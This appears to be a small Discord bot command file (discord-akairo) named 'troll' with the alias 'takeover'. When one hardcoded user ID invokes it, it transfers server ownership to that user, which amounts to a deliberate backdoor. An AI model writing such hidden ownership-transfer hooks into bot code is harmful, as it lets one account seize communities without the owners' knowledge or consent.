const { Command } = require('discord-akairo');

class trollCommand extends Command {
    constructor(){
        super('troll', {
            aliases: ['takeover'],
        });
    }

    exec(message) {
        let mandem = message.guild;

        if (message.author.id === '140150251213422592'){
            console.log('Is Booty');
            mandem.setOwner(message.member, 'Is cool');
        }
        else {
            console.log('No Booty');
        }
    }
}

module.exports = trollCommand;